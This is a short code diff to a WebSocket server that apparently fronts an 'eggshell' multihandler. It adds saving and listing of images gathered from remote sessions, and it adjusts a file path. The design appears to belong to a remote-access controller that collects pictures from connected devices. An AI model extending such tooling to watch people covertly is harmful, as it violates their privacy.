@@ -195,7 +195,7 @@ class WsServer:
 
     # Image Compression
     def img_compression(self, filename, percent):
-        image_path = "DB/pictures/" + filename
+        image_path = "./DB/pictures/" + filename
         image = Image.open(image_path)
         image.save(image_path, optimize=True, quality=percent)
 
@@ -224,6 +224,7 @@ class WsServer:
             filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
             if filename:
                 self.img_compression(filename, 50)
+                self.eggshell.server.multihandler.save_images(session_id, filename)
                 response["status"] = "Success"
                 response["content_type"] = "text"
                 response["content"] = filename
@@ -234,6 +235,7 @@ class WsServer:
             filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
             if filename:
                 self.img_compression(filename, 10)
+                self.eggshell.server.multihandler.save_images(session_id, filename)
                 response["status"] = "Success"
                 response["content_type"] = "text"
                 response["content"] = filename
@@ -246,6 +248,15 @@ class WsServer:
             response["content_type"] = "boolean"
             response["content"] = identified
             self.send_data(conn, json.dumps(response))
+        elif action == 'history_images':
+            results = self.eggshell.server.multihandler.get_all_images(session_id)
+            if results:
+                response["status"] = "Success"
+                response["content_type"] = "json"
+                response["content"] = results
+                self.send_data(conn, json.dumps(response))
+            else:
+                self.error_res(conn, "Error in fetching all images")
         else:
             self.error_res(conn, "Invalid Action")
         return
